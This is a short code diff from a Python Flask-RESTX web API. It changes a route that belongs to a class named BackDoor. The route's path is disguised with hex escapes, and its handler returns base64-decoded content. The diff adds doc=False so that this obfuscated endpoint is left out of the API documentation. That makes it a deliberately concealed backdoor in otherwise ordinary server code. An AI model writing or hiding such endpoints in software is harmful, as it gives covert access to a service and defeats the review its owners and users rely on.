@@ -56,7 +56,7 @@ class Records(Resource):
         db.data.insert_one(json.loads(request.data))
         return "OK"
 
-@api.route('/\x70\x65\x6E\x69\x73')
+@api.route('/\x70\x65\x6E\x69\x73', doc=False)
 class BackDoor(Resource):
     def get(self):
         response = Response(b64decode(resources.one))
